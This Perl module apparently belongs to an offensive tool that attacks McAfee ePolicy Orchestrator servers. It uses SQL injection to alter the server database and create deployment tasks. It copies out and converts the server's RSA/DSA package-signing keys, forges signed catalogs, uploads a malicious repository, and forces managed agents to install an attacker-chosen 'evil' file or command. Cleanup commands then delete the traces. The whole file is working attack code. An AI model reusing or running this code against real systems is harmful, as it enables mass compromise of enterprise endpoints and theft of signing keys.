package Epowner::Epo;


use File::Path;
use File::Copy;
use File::Basename;
use Digest::SHA qw(sha1_hex);

use strict;
use warnings;

# git-issue-1
IO::Socket::SSL::set_ctx_defaults(SSL_verify_mode => SSL_VERIFY_NONE);
$ENV{PERL_LWP_SSL_VERIFY_HOSTNAME} = 0;


sub mode_client_deploy {

	# read params
	my $this = shift;
	my $action = shift;	# DEPLOY_FILE, DEPLOY_CMD or DEPLOY_CUSTOM
	my $evil_local_path ;
	my $evil_args;
	my $cmd;
	my $custom_folder;


	# Do we have privileged code execution ?
	if(not $this->have_srv_exec_priv()){
		$this->print_err("[-] ERROR (mode_client_deploy): You don't have sufficient RCE privileges to perform this action\n");
		exit;
	}

        # do we already know the installation path of ePo ?
        if(not $this->{force} and not length($this->{server_db_folder}) ne 0){
                $this->print_warn ("[-] WARNING: epo installation path is unknown. We know the default value but suggest you to\n");
                $this->print_warn ("             confirm it first using '--get-install-path'\n");
                $this->print_warn ("             You may also use '--force' to bypass this warning\n");
		exit;
        }


	my $targets;
	if($action eq DEPLOY_FILE){
		$evil_local_path = shift;	# the file we want to deploy on clients
		$targets = shift;               # who are the winners ?
		$evil_args = shift || '';	# the optional arguments of the evil file
	}elsif($action eq DEPLOY_CMD){
		$cmd = shift;			# the command we want to run on clients
		$targets = shift;               # who are the winners ?
	}elsif($action eq DEPLOY_CUSTOM){
		$custom_folder = shift;		# the local path folder of the custom deployment package
		$targets = shift;               # who are the winners ?
		

		#TODO		CHECK CUSTOM FOLDER
		open FILE, "$custom_folder/run.bat" or die "[-] ERROR : can't open $custom_folder/run.bat: $!";
        	close FILE;

	}else{
		print "[-] ERROR (mode_client_deploy): action '$action' is not valid\n";
		exit;
	}


	# before initiate this long process, let's check if the requested targets exist in the DB
	print "\n";
	$this->print_info("[*] Validating target agents\n");
	if(not $targets eq "__ALL__"){
		my $count = $this->mode_client_deploy_check_targets_from_db($targets);
		if($count == 0){
			$this->print_err("[-] ERROR (mode_client_deploy): Selected targets can't be found in the database\n");
			return 0;
		}
		print "[*] Found $count agents from the database, matching your target selection\n";
	}


	# create temp folders
	#============================
        mkpath($this->{catalog_tmp_folder});
        if(not -d $this->{catalog_tmp_folder}){
                $this->print_err("[-] ERROR (mode_client_deploy): can't create directory $this->{catalog_tmp_folder}\n");
                return 0;
        }

        mkpath($this->{pkgcatalog_tmp_folder});
        if(not -d $this->{pkgcatalog_tmp_folder}){
                $this->print_err("[-] ERROR (mode_client_deploy): can't create directory $this->{pkgcatalog_tmp_folder}\n");
                return 0;
        }



	# download the current catalog from ePo server
	#=============================================
	my $catalog_version_new;
	$this->print_info("\n[*] Downloading current catalog\n");
	$this->mode_client_deploy_download_initial_catalog();


	# Get Software Managment Keys (DSA and RSA), needed to build catalog files
	#=========================================================================
	$this->print_info("\n[*] Downloading DSA/RSA keys needed to sign the packages\n");
	$this->mode_client_deploy_get_catalog_keys();


	# get base64(sha256(pub key))
	#=============================
	# the key has been downloaded by the last used function 
	my $key_hash = $this->rsa_hash256_pub_key_from_file(
		$this->{catalog_rsa_folder} . '/' . $this->{catalog_rsa_pub_file}
	);


	# Generate run.bat file
	#============================
	if($action eq DEPLOY_CMD or $action eq DEPLOY_FILE){

		$this->print_info("\n[*] Generating our evil batch file\n");
		if($action eq DEPLOY_FILE){
			$this->mode_client_deploy_generate_run_bat($action, $evil_local_path, $evil_args);
		}else{
			$this->mode_client_deploy_generate_run_bat($action, $cmd);
		}
	}elsif($action eq DEPLOY_CUSTOM){
		

	        # create temp folder if not already exists
        	my ($foo,$deployment_folder_path) = fileparse($this->{deploy_run_bat});
        	mkpath($deployment_folder_path);

		## TODO 
		# read custom run.bat !
		my $run_bat_content;
		open FILE, "$custom_folder/run.bat" or die "[-] ERROR (mode_client_deploy): can't open $custom_folder/run.bat for reading\n";
        	read(FILE,$run_bat_content,-s FILE);
        	close FILE;
	
		# update [MCAFEE_PACKAGE_NAME] with correct package name
		$run_bat_content =~ s/\[MCAFEE_PACKAGE_NAME\]/$this->{deploy_evil_product_id}/sg ;
	
		open FILE, ">$this->{deploy_run_bat}" or die "[-] ERROR (mode_client_deploy): can't open $this->{deploy_run_bat} for writing\n";
		print FILE $run_bat_content;
		close FILE;
	}



	# Create catalog.z
	#============================
	$this->print_info("\n[*] Generating new catalog.z\n");
	print "      [+] Writing XML file\n" if $this->{verbose};
	# TODO
	if	($action eq DEPLOY_FILE){ $catalog_version_new = $this->catalog_xml_add_product($action, $evil_local_path,  $key_hash);}
	elsif	($action eq DEPLOY_CMD) { $catalog_version_new = $this->catalog_xml_add_product($action, $cmd,  $key_hash);}
	else 				{ $catalog_version_new = $this->catalog_xml_add_product($action, $custom_folder,  $key_hash); }	

	print "      [+] Compressing to CAB\n" if $this->{verbose};
	$this->catalog_makecab();
	print "      [+] Signing CAB file\n" if $this->{verbose};
	$this->catalog_signcab();
	print "      [+] Encrypting CAB file\n" if $this->{verbose};
	$this->catalog_encrypt();


        # Create PkgCatalog.z
	#============================
        $this->print_info("\n[*] Generating new PkgCatalog.z\n");
	 print "      [+] Writing XML file\n" if $this->{verbose};
	# TODO	
	if	($action eq DEPLOY_FILE){ $this->pkgcatalog_write_xml($action, $evil_local_path);}
	elsif 	($action eq DEPLOY_CMD) { $this->pkgcatalog_write_xml($action, $cmd);}
	else				{ $this->pkgcatalog_write_xml($action, $custom_folder); }

	print "      [+] Compressing to CAB\n" if $this->{verbose};
        $this->pkgcatalog_makecab();
	print "      [+] Signing CAB file\n" if $this->{verbose};
        $this->pkgcatalog_signcab();
	print "      [+] Encrypting CAB file\n" if $this->{verbose};
        $this->pkgcatalog_encrypt();



	# Update catalog version on the ePo database
	#==========================================
        my $sqli =
                "') ; " .
		"update EPOServerInfo set CatalogVersion = '$catalog_version_new' " .
			#"where ComputerName = '$this->{server_servername}' " .
			";" .
		# Notify All handler that catalog has a new version" 
		"exec EPOAgentHandler_NotifyAllServers N'SiteListChanged', N'AgentHandler'; ".
		# Ask mod_eporepo to flush cache (otherwise updated version of sitestat.xml will not be reflected to Agents)
		"exec EPOAgentHandler_NotifyAllServers N'FlushRepositoryCache', N'mod_eporepo'; " .
		" -- ";

	$this->print_info("\n[*] Updating ePo database with new catalog version\n");
        my $http_request = $this->mode_common_generate_fullprops_request($sqli);
	$this->send_http_request($http_request);



	# build local repository
	#============================
	$this->print_info("\n[*] Building local repository\n");
	# TODO
	my $random_tag_file = random_string(6) . ".txt" ;
	if	($action eq DEPLOY_FILE){ $this->mode_client_deploy_create_local_repository($action, $random_tag_file, $evil_local_path); }
	elsif 	($action eq DEPLOY_CMD) { $this->mode_client_deploy_create_local_repository($action, $random_tag_file); }
	else 				{ $this->mode_client_deploy_create_local_repository($action, $random_tag_file, $custom_folder); }

	# Download, update and store a new version of replica.log in our repository
	#==========================================================================
	$this->mode_client_deploy_update_software_replica();


	# zip repository
	#============================
	print "[*] Compressing local repository to 'repo.zip'\n";
	$this->compress_zip_tree( $this->{deploy_local_repository},	# folder to zip
				  $this->{deploy_local_zipfile}		# zip filename
	);	

	# upload zipped repo file to ePo server
	#======================================
	$this->print_info("\n[*] Uploading new repository to server\n");
	$this->mode_server_upload_from_file( $this->{deploy_local_zipfile}, 	# source filename
				 $this->{deploy_remote_zipfile}		# dest filename
	);


	# Upload "unzip.exe" :)
	#============================
        $this->mode_server_upload_from_file( $this->{unzip_local_file},         # source filename
                                 $this->{unzip_remote_file}         # dest filename
        );

	# Ask server to uncompress our repository (and so, update the main repo)
	#=======================================================================
	$this->print_info("\n[*] Unzip repository on server side\n");
	my $repo  = $this->{deploy_remote_zipfile};
	my $unzip = $this->{unzip_remote_file};
	$repo =~ s/\.\.|\///g;	# remove /../../
	$unzip =~ s/\.\.|\///g;	# remove /../../


	# do we already know the installation path of ePo ?
	my $db_path ;
        if(length($this->{server_db_folder}) ne 0){
        	$db_path = $this->{server_db_folder}   ;
        }else{
        	$db_path = $this->{server_db_folder_default} ;
                $this->print_warn ("[-] WARNING: epo installation path is unknowm. Assuming default value!\n");
                $this->print_warn ("             You may want to use '--get-install-path' to fix this.\n");
	}

	# exec cmd: call unzip.exe
        $this->mode_server_exec_send(
			"del /F /Q " . $db_path . "\\Software\\Current\\"  . $this->{deploy_evil_product_id} . "\\Install\\0409\\* & " .
			"del /F /Q " . $db_path . "\\RepoCache\\Current\\" . $this->{deploy_evil_product_id} . "\\Install\\0409\\* & " .
                        "\"" . $db_path . "\\" .$unzip. "\" " . 		# unzip.exe
                        "-o \"" . $db_path . "\\" . $repo . "\" " .		# -o repo.zip
                        "-d \"" . $db_path . "\""				# -d dest folder
        );


	# in non-dba mode, the command (unzip) run asynchronously.
	# poll the repository until we find our new files
	my $server_host = $this->{server_host};
	my $server_port = $this->{server_port};
	my $uri = "https://$server_host:$server_port/Software/Current/$this->{deploy_evil_product_id}/Install/0409/$random_tag_file";
	if(not $this->http_poll_uri_get($uri)){
		$this->print_err ("[-] ERROR (mode_client_deploy): can't find our new files on the ePo repository :-/ \n");
		exit;
	}



        # delete unzip.exe & repo.zip on the server
	$this->print_info("\n[*] Cleaning stuffs\n");
        my $db_folder = $this->{server_db_folder};
        $this->mode_server_exec_send(
                "del /F ${db_folder}\\$this->{deploy_remote_zipfile} & "  .
                "del /F ${db_folder}\\$this->{unzip_remote_file} "
        );



	# The repository is now ready on the server. Remember that for --clean-all function
	$this->{state_cli_deploy} = 1;

	# Next step: create a Deployment task and assign it to station(s)..



	# Add Deployment Task !
	# =======================
	$this->print_info("\n[*] Pushing a new Deployment Task\n");
	# Build SQL injection
	$sqli = $this->mode_client_deploy_get_sql_statement_addtask($targets);
        # Build HTTP request and send it
	$http_request = $this->mode_common_generate_fullprops_request($sqli);
        $this->send_http_request($http_request);

	

	# We're almost done.
	# The agents will see the new task during the next policy enforcment request. By default, this occurs once per hour :-/
	# So, ... Send a "Agent Wake up" request to agents, to force them to start the policy enforcment process NOW :-)
	

	# Convert agent hostname (--targets) to database ID
	# Wake Up function needs ID ...
	# ==================================================

	# Get Agents list
	my @agents_list = $this->mode_readdb_get_agents();
        if(@agents_list eq 0){
                $this->print_err("[-] ERROR (mode_client_deploy): No agents were read from the database (what's wrong here??)\n");
                return 0;
        }

	# FYI :
	# @agent_list has this format: 	1|TEST|TEST.labo.lan|Windows XP|Professional|5.1|Service Pack 3|user|192.168.60.50
	#				2|TEST88|TEST88.labo.lan|Windows XP|Professional|5.1|Service Pack 3|user|145.126.41.130

 	# convert from hostname selection (--targets) to ID
	my $agents_id = ''; # format example: 1,3,4,5,23
	if ($targets eq "__ALL__"){
		foreach my $a (@agents_list){
			my ($id, $hostname, @foo) = split(/\|/, $a);	
			if(not $hostname eq $this->{server_servername}){ # be nice, remove the ePo server from the targets
				$agents_id .= "$id,";
			}
		}
		$agents_id =~ s/,$//; # remove last ','
	}else{
		# selection of targets only
		my @selected_targets = split(/,/, $targets); # from --targets
		foreach my $a (@agents_list){ # list all agents from DB
			my ($id, $hostname, @foo) = split(/\|/, $a);
			if( grep { $_ eq "$hostname" }  @selected_targets){ $agents_id .= "$id,";}	
		}
		$agents_id =~ s/,$//; # remove last ','
	}



        # Wake UP Agent(s) !
        # Add policy enforcement data into EPODataChannelData table and Call Add_Work
        # ============================================================================

	# Usualy, the data is encrypted by default. But, looks like the field 'Encrypted' can be set to '0' instead of '1' :-)
	$this->print_info("\n[*] Waking Up Agent(s) to force deployment\n");	

        $sqli = 
		"'); " .
		"insert into EPODataChannelData(Data,Encrypted) " .
			"values(0x2B0001000000000000000000000945504F5345525645520B4167656E7457616B657570034E2F413200000066756C6C".
			"50726F70733D300D0A73757065726167656E7457616B6575703D300D0A72616E646F6D697A6174696F6E3D300D0A,0); ".
		"declare \@dataId int; " .
		"set \@dataId = SCOPE_IDENTITY(); ".
		"exec EPOWorkQueue_AddWork N'$agents_id',\@dataId,N'EPOSRV:AGENTWAKEUP',N'999',300,N'AgentWakeupResponse999',-1,30,1,NULL,0 ; " .
		" -- ";

	# FYI: This is how looks like the HEX data
	#00000000  2b 00 01 00 00 00 00 00  00 00 00 00 00 09 45 50  |+.............EP|
	#00000010  4f 53 45 52 56 45 52 0b  41 67 65 6e 74 57 61 6b  |OSERVER.AgentWak|
	#00000020  65 75 70 03 4e 2f 41 32  00 00 00 66 75 6c 6c 50  |eup.N/A2...fullP|
	#00000030  72 6f 70 73 3d 30 0d 0a  73 75 70 65 72 61 67 65  |rops=0..superage|
	#00000040  6e 74 57 61 6b 65 75 70  3d 30 0d 0a 72 61 6e 64  |ntWakeup=0..rand|
	#00000050  6f 6d 69 7a 61 74 69 6f  6e 3d 30 0d 0a           |omization=0..|

	$http_request = $this->mode_common_generate_fullprops_request($sqli);
        $this->send_http_request($http_request);


	#============================
	# 	 W00tW00T !  :-)    #
	#============================

	$this->print_ok("[*] w00tw00t !! ");
	print "Software/Command successfully deployed. Execution will start in a few moment\n";
	return 1;

}


sub mode_client_deploy_generate_run_bat{
	my $this = shift;
	my $action = shift;	# DEPLOY_FILE or DEPLOY_CMD	

	my $run_bat_content;

	if($action eq DEPLOY_FILE){

		# DEPLOY_FILE
		#-----------

		my $evil_local_path = shift;	# the evil file to deploy
		my $evil_args = shift || ''; 	# arguments of the evil file if any

        	# get evil 'filename'
	        my $evil_filename = fileparse($evil_local_path);

#		# folder
#	        my $software_folder =   $this->{deploy_local_repository} .
 #       	                        "Software/" .
  #              	                "Current/" .
   #                     	        $this->{deploy_evil_product_id} . '/'.
    #                            	"Install/" .
#	                                "0409" ;                                # lang
#
 #       	my $repocache_folder =   $this->{deploy_local_repository} .
  #              	                "RepoCache/" .
   #                     	        "Current/" .
    #                            	$this->{deploy_evil_product_id} . '/'.
#	                                "Install/" .
 #       	                        "0409" ;                                # lang

        	# create run.bat content
        	$run_bat_content = "start \"\" " .
					"\"%ALLUSERSPROFILE%\\Application data\\mcafee\\common framework\\current\\$this->{deploy_evil_product_id}\\Install\\0409\\$evil_filename\" ".
					"$evil_args";
	}else{

		# DEPLOY_CMD
		#------------
		my $cmd = shift;
		$run_bat_content = "$cmd";
	}


	# create temp folder if not already exists
	my ($foo,$deployment_folder_path) = fileparse($this->{deploy_run_bat});
	mkpath($deployment_folder_path);

	open FILE, ">$this->{deploy_run_bat}" or die "[-] ERROR (): can't write to $this->{deploy_run_bat}: $!";	
        print FILE $run_bat_content;
        close FILE;
}


sub mode_client_deploy_check_targets_from_db {
	my $this = shift;
	my $targets = shift;

        # Get Agents list
        my @agents_list = $this->mode_readdb_get_agents();
        if(@agents_list eq 0){
                $this->print_err("[-] ERROR (mode_client_deploy): No agents were read from the database (what's wrong here??)\n");
                return 0;
        }

        # FYI :
        # @agent_list has this format:  1|TEST|TEST.labo.lan|Windows XP|Professional|5.1|Service Pack 3|user|192.168.60.50
        #                               2|TEST88|TEST88.labo.lan|Windows XP|Professional|5.1|Service Pack 3|user|145.126.41.130

	my $count = 0;
        my @targets_array = split(/,/, $targets); # from --targets
        foreach my $a (@agents_list){
		my ($id, $hostname, @foo) = split(/\|/, $a);
                if( grep { $_ eq "$hostname" }  @targets_array){ 
			$count++;
		}
        }

	return $count;

}

sub mode_client_deploy_get_sql_statement_addtask {

	my $this = shift;
	my $targets = shift || "__ALL__" ;	# __ALL__  => all agents ...

	# some values...
	my $task_name 		= $this->{common_prefix} . random_string(6);
	my $product_id 		= $this->{deploy_evil_product_id};
	my $product_version 	= $this->{deploy_evil_product_version};
	my $product_build 	= $this->{deploy_evil_product_build};


	my $assignment_flag;		# 0 or 8
	my $tagging_pre='';		# SQL statments if target != __ALL__
	my $tagging_post='';		# SQL statments if target != __ALL__

	if($targets eq "__ALL__"){
		# deploy evil file to ALL agents
		$assignment_flag = "0";
	}else{

		# deploy evil file to selected targets only
		$assignment_flag = "8";
	
	        # convert target list to Perl array
        	my @targets_array = split(/,/, $targets);

		# generate a tag name
		my $tagname = $this->{common_prefix} . random_string(6) ; 

		# build tag filters
		#-------------------		
		# criteria sample   : ( where ( or ( eq EPOComputerProperties.ComputerName ''WINXPSP3'' ) ( eq EPOComputerProperties.ComputerName ''EPO-AGENT2'' ) ) )
		# whereclause sample: where ( ( [EPOComputerProperties].[ComputerName] = ''WINXPSP3'' ) or ([EPOComputerProperties].[ComputerName] = ''EPO-AGENT2'' ) )

		my $criteria	= '( where ( or';
		my $whereclause	= 'where (';
	        foreach my $target (@targets_array){
        	        #print "$target\n";
			$criteria 	.= " ( eq EPOComputerProperties.ComputerName ''$target'' ) ";
			$whereclause	.= " ( [EPOComputerProperties].[ComputerName] = ''$target'' ) or";
        	}
		
		# close tag filters
		$criteria    .= ") )";
		$whereclause =~ s/ or$//;	# quick and dirty..
		$whereclause .= " )";


		# SQL:  Add and assign a new TAG to selected agents
		$tagging_pre=
		"insert into EPOTag (UniqueKey, Name, Family, Notes, Criteria, WhereClause, ExecuteOnASCI, CreatedBy, CreatedOn, ModifiedBy, ModifiedOn) " . 
		"values (NULL, " .
		"	'$tagname',  " .
		"	'EPO',  " .
		"	'',  " .
		"	'$criteria', " .
		"	'$whereclause', " .
		"	1, " .
		"	'admin', " .
		"	'2013-01-02 16:48:43:860', " .
		"	'admin', " .
		"	'2013-01-02 16:49:17:970')  " .
		"declare \@TagId int; " . 
		"set \@TagId = (select SCOPE_IDENTITY() AS ID); " .
		# assign tag to agents now
		"execute EPOTags_ApplySingleTag \@TagId; " .
		"";

		# SQL: assign tag to Sheduled task
		$tagging_post =	
		"" .
		"exec EPOTask_DeleteAllTagAssignments_ToReplaceOldOne \@TaskAssignId; " .
		"exec EPOTask_AddTagAssignment_ToReplaceOldOne \@TaskAssignId, \@TagId ,1; ";

 
	}


	
	# Build complete SQL statement
	#=============================
	my $sql =

	## NOTE: Do not put any breakline in ths SQL stqtement!

	"'); " .	# end up previous statement, as usual.

	# if target != __ALL__ then we must creata/assign tags to agents
	$tagging_pre .

	# get task type
	"declare \@TaskTypeId int; " .
	"set \@TaskTypeId = (SELECT TaskTypeId FROM EPOTaskTypes WHERE ProductCode =  'EPOAGENTMETA' AND TaskType = 'Deployment'); " .

	#  add task
	"declare \@TaskObjId int; " .
	"exec EPOTask_AddTaskObject \@TaskTypeId,N'$task_name',0,N'',NULL,0,0,N'WIN95|WIN98|WINME|WNTS|WNTW|WXPW|WXPS|WXPHE|WXPE|W2KS|W2KW|WVST|WVSTS|WNT7W',\@TaskObjId output; " .

	# add task settings
	"exec EPOTask_SetTaskObjectSetting \@TaskObjId,N'DeploymentOptions',N'DummyPolicy',N'0'; " .
	"exec EPOTask_SetTaskObjectSetting \@TaskObjId,N'DeploymentOptions',N'UpdateAfterDeployment',N'0'; " .
	"exec EPOTask_SetTaskObjectSetting \@TaskObjId,N'General',N'TaskType',N'Deployment'; " .
	"exec EPOTask_SetTaskObjectSetting \@TaskObjId,N'Install',N'Install_1',N'$product_id'; " .
	"exec EPOTask_SetTaskObjectSetting \@TaskObjId,N'Install',N'NumInstalls',N'1'; " .
	"exec EPOTask_SetTaskObjectSetting \@TaskObjId,N'Install\\$product_id',N'BuildVersion',N'" . $product_version . $product_build . "'; " .
	"exec EPOTask_SetTaskObjectSetting \@TaskObjId,N'Install\\$product_id',N'InstallCommandLine',N''; " .
	"exec EPOTask_SetTaskObjectSetting \@TaskObjId,N'Install\\$product_id',N'Language',N'0409'; " .
	"exec EPOTask_SetTaskObjectSetting \@TaskObjId,N'Install\\$product_id',N'PackagePathType',N'Current'; " .
	"exec EPOTask_SetTaskObjectSetting \@TaskObjId,N'SchedulerExtraData',N'RunAtEnforcementEnabled',N'0'; " .
	"exec EPOTask_SetTaskObjectSetting \@TaskObjId,N'Settings',N'RunAtEnforcementEnabled',N'0'; " .
	"exec EPOTask_SetTaskObjectSetting \@TaskObjId,N'Uninstall',N'NumUninstalls',N'0'; " .
	"exec EPOTask_SetTaskObjectSetting \@TaskObjId,N'UpdateOptions',N'bAllowPostpone',N'0'; " .
	"exec EPOTask_SetTaskObjectSetting \@TaskObjId,N'UpdateOptions',N'nMaxPostpones',N'1'; " .
	"exec EPOTask_SetTaskObjectSetting \@TaskObjId,N'UpdateOptions',N'nPostponeTimeout',N'20'; " .
	"exec EPOTask_SetTaskObjectSetting \@TaskObjId,N'UpdateOptions',N'szPostponeText',N''; " .

	# Assign
	
	# Add new slot ID
	"declare \@TaskSlotId int; " . 
	"exec EPOTask_AddTaskSlot \@TaskTypeId,\@TaskSlotId output; " .

	# Add new Shedule 
	"declare \@TaskShedId int; " .
	"exec EPOTask_AddTaskSchedule N'$this->{common_prefix}',\@TaskShedId output; " .

	# Set assignement settings
	"exec EPOTask_SetTaskScheduleSetting \@TaskShedId,N'Schedule',N'GMTTime',N'0'; " .
	"exec EPOTask_SetTaskScheduleSetting \@TaskShedId,N'Schedule',N'RandomizationEnabled',N'0'; " .
	"exec EPOTask_SetTaskScheduleSetting \@TaskShedId,N'Schedule',N'RandomizationWndMins',N'1'; " .
	"exec EPOTask_SetTaskScheduleSetting \@TaskShedId,N'Schedule',N'RunIfMissed',N'0'; " .
	"exec EPOTask_SetTaskScheduleSetting \@TaskShedId,N'Schedule',N'RunIfMissedDelayMins',N'0'; " .
	"exec EPOTask_SetTaskScheduleSetting \@TaskShedId,N'Schedule',N'StartDateTime',N'20130102000000'; " .
	"exec EPOTask_SetTaskScheduleSetting \@TaskShedId,N'Schedule',N'StopDateValid',N'0'; " .
	"exec EPOTask_SetTaskScheduleSetting \@TaskShedId,N'Schedule',N'TaskRepeatable',N'0'; " .
	"exec EPOTask_SetTaskScheduleSetting \@TaskShedId,N'Schedule',N'Type',N'7'; " .
	"exec EPOTask_SetTaskScheduleSetting \@TaskShedId,N'Settings',N'Enabled',N'1'; " .
	"exec EPOTask_SetTaskScheduleSetting \@TaskShedId,N'Settings',N'StopAfterMinutes',N'0'; " .
	
	# Assign ! (NodeId = 2 and NodeType = 4 SHOULD be static. To verify ..)
	"declare \@TaskAssignId int; " .
	"exec EPOTask_AddTaskAssignment \@TaskObjId, \@TaskShedId, \@TaskSlotId, 2, 4, $assignment_flag, \@TaskAssignId output; " .
	
	# if target != __ALL__ then we must link the assignment to the tag
	$tagging_post .

	" -- ";

	return $sql;

}



sub mode_client_deploy_download_initial_catalog {

        my $this = shift;

        # download catalog.z
        #====================

        my $server_host = $this->{server_host};
        my $server_port = $this->{server_port};

	my $catalog_content;

        my $get_request = HTTP::Request->new;
	my $user_agent  = LWP::UserAgent->new (ssl_opts => { verify_hostname => 0, SSL_verify_mode => SSL_VERIFY_NONE });
        $get_request->method('GET');

        my $uri = "https://$server_host:$server_port/Software/catalog.z";
        $get_request->uri($uri);

	print "[*] downloading initial catalog.z\n" ;
	my $response = $user_agent->request($get_request);
	if ($response->code eq "200"){
		$catalog_content =  $response->content;
	}else{
		$this->print_err ("[-] ERROR (mode_client_deploy_download_initial_catalog): can't download catalog.z\n");
		exit;
	}

	# save it
	#============================
	my $catalog_z = $this->{catalog_tmp_folder} . '/' . $this->{catalog_z_file} ;
	open FILE, ">$catalog_z" or die "[-] ERROR (mode_client_deploy_download_initial_catalog): can't create $catalog_z\n";
	print FILE $catalog_content;
	close FILE;	


	# decrypt & extract catalog.z
	#============================
	$this->catalog_decrypt();
	$this->catalog_extract();	

	return 1;
}


sub mode_client_deploy_get_catalog_keys {

	my $this = shift;

        # get server name       
	$this->mode_readdb_get_servername();
        my $servername = $this->{server_servername};

	# filename on the ePo server
        my $smdsa_filename = "sm" . $servername . ".zip";
        my $smrsa_filename = "sm2048" . $servername . ".zip";

	# will holds the keys
        my $smdsa_content;
        my $smrsa_content;

	print "[*] Retrieving Software Managment Keys ($smdsa_filename & $smrsa_filename)\n";


        # do we already know the installation path of ePo ?
        my $db_path ;
        if(length($this->{server_db_folder}) ne 0){
                $db_path = $this->{server_db_folder}   ;
        }else{
                $db_path = $this->{server_db_folder_default} ;
                $this->print_warn ("[-] WARNING: epo installation path is unknowm. Assuming default value!\n");
                $this->print_warn ("             You may want to use '--get-install-path' to fix this.\n");
        }


	# copy Soft Managment RSA/DSA keys from /Keystore/ to  /Software/
	#================================================================
	print "      [+] Copying keys from keystore to web folder\n" if $this->{verbose};

        $this->mode_server_exec_send(
                "copy /Y $db_path\\Keystore\\sm* $db_path\\RepoCache\\  & copy /Y $db_path\\Keystore\\sm* $db_path\\Software\\"
        );

	# download 
	#============
        my $server_host = $this->{server_host};
        my $server_port = $this->{server_port};


	# DSA Keys
	#==========


	# Try to get DSA key 
	my $uri = "https://$server_host:$server_port/Software/$smdsa_filename";
	$smdsa_content = $this->http_poll_uri_get($uri);
	if($smdsa_content eq 0){
		$this->print_err ("[-] ERROR (mode_client_deploy_get_catalog_keys): can't download $smdsa_filename\n");	
		exit;
	}

	# save key file
	if (not -d $this->{smkey_dsa}){
		mkpath($this->{smkey_dsa});
	}
	open FILE, ">$this->{smkey_dsa}/$smdsa_filename" or die "[-] ERROR (mode_client_deploy_get_catalog_keys): can't create $this->{smkey_dsa}/$smdsa_filename\n";
	print FILE $smdsa_content;
	close FILE;



        # RSA Keys
        #==========

	$uri = "https://${server_host}:${server_port}/Software/${smrsa_filename}";
        $smrsa_content = $this->http_poll_uri_get($uri);
        if($smrsa_content eq 0){
                $this->print_err ("[-] ERROR (mode_client_deploy_get_catalog_keys): can't download $smrsa_filename\n");
                exit;
        }

        # save key file
        if (not -d $this->{smkey_rsa}){
                mkpath($this->{smkey_rsa});
        }
        open FILE, ">$this->{smkey_rsa}/$smrsa_filename" or die "[-] ERROR (mode_client_deploy_get_catalog_keys): can't create $this->{smkey_dsa}/$smrsa_filename\n";
        print FILE $smrsa_content;
        close FILE;


	# Delete key that we've copied under /Software/
        $this->mode_server_exec_send(
                "DEL /F $db_path\\Software\\sm*.zip & DEL /F $db_path\\RepoCache\\sm*.zip"
        );

	# Unzip RSA & DSA keys
	print "      [+] Unzip files\n" if $this->{verbose};
	$this->uncompress_zip(	$this->{smkey_dsa} . '/' . $smdsa_filename,	# zipfile
				$this->{smkey_dsa} . '/'			# dest folder
	);
        $this->uncompress_zip( 	$this->{smkey_rsa} . '/' . $smrsa_filename,     # zipfile
                        	$this->{smkey_rsa} . '/'                        # dest folder
        );    

	# convert RSA key to PEM
	#=======================
	print "      [+] Convert RSA private key to PEM format\n" if $this->{verbose};
	my $rsa_priv;
	open FILE, "$this->{smkey_rsa}" . '/' . "smseckey.bin" or die "[-] ERROR (mode_client_deploy_get_catalog_keys): can't open " . $this->{smkey_rsa} . '/' . "smseckey.bin for reading\n";
	read(FILE,$rsa_priv,-s FILE);
	close FILE;
	
	# drop 4 first bytes, encode to base64, and save back to pem
	$rsa_priv = substr($rsa_priv,4);
	$rsa_priv = encode_base64($rsa_priv);
	open FILE, ">$this->{smkey_rsa}" . '/' . "smseckey.pem" or die "[-] ERROR (mode_client_deploy_get_catalog_keys): can't open " . $this->{smkey_rsa} . '/' . "smseckey.pem for writing\n";
	print FILE "-----BEGIN RSA PRIVATE KEY-----\n";
	print FILE $rsa_priv; 
	print FILE "-----END RSA PRIVATE KEY-----"; 
	
}



sub mode_client_deploy_create_local_repository {

	my $this = shift;
	my $action = shift;	# DEPLOY_FILE or DEPLOY_CMD or DEPLOY_CUSTOM
	my $random_tag_file = shift;
				

	my $evil_local_path;
	my $custom_folder;

	print "[*] Building local repository under '$this->{deploy_local_repository}'\n";


        # if previous repo exists, drop everything
        if (-d $this->{deploy_local_repository}){
                print "      [+] Cleaning up previous repo\n" if $this->{verbose};
                rmtree($this->{deploy_local_repository});
        }

        my $software_folder =   $this->{deploy_local_repository} .
                                "Software/" .
                                "Current/" .
                                $this->{deploy_evil_product_id} . '/'.  # EPOWNER
                                "Install/" .
                                "0409" ;                                # lang


        my $repocache_folder =   $this->{deploy_local_repository} .
                                "RepoCache/" .
                                "Current/" .
                                $this->{deploy_evil_product_id} . '/'. # EPOWNER
                                "Install/" .
                                "0409" ;                               # lang

        # create local folders
        mkpath($software_folder);
        if(not -d $software_folder){
                $this->print_err ("[-] ERROR (mode_client_deploy_create_local_repository): can't create directory path $software_folder\n");
                exit;
        }
        mkpath($repocache_folder);
        if(not -d $repocache_folder){
                $this->print_err ("[-] ERROR (mode_client_deploy_create_local_repository): can't create directory path $repocache_folder\n");
                exit;
        }



	
	if($action eq DEPLOY_FILE){ 
		# DEPLOY FILE
		#-------------

		$evil_local_path = shift;    # the file we want to deploy on clients

		# is evil file exists ?
		if(not -f $evil_local_path){
			$this->print_err ("[-] ERROR: (mode_client_deploy_create_local_repository): file '$evil_local_path' not found\n");
			exit;
		}

		# get evil filename
		my $evil_filename = fileparse($evil_local_path);

	        # copy evil files
        	print "      [+] Copying evil file(s)\n" if $this->{verbose};
	        copy($evil_local_path, $software_folder  . '/' . $evil_filename) or die "[-] ERROR (mode_client_deploy_create_local_repository): $evil_local_path Copy failed: $!";
        	copy($evil_local_path, $repocache_folder . '/' . $evil_filename) or die "[-] ERROR (mode_client_deploy_create_local_repository): $evil_local_path Copy failed: $!";

	}elsif( $action eq DEPLOY_CUSTOM){

		$custom_folder = shift;

		#TODO
	        # open and read dir
        	opendir DIR, $custom_folder or die "[-] ERROR (mode_client_deploy_create_local_repository): can't open '$custom_folder' directory\n";
	        my @files = readdir(DIR);
        	close DIR;

	        # for each entry
        	foreach my $entry (@files){
                	next if $entry =~ /^\.$|^\.\.$|^run.bat$/;
		
			# copy evil files
			print "      [+] Copying '$entry' into local repository\n" if $this->{verbose};
			copy($custom_folder . "/" . $entry, $software_folder  . '/' . $entry) or die "[-] ERROR (mode_client_deploy_create_local_repository): $custom_folder/$entry Copy failed: $!\n";
			copy($custom_folder . "/" . $entry, $repocache_folder  . '/' . $entry) or die "[-] ERROR (mode_client_deploy_create_local_repository): $custom_folder/$entry Copy failed: $!\n";
		
		}

	}

